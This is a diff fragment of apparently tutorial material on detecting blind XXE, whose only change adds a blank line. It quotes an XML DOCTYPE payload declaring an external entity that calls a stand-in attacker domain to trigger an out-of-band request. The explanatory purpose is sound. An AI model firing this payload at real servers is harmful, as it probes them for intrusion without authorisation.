@@ -14,3 +14,4 @@ You can often detect blind XXE using the same technique as for [XXE SSRF attacks
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
 ```
 This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful
+
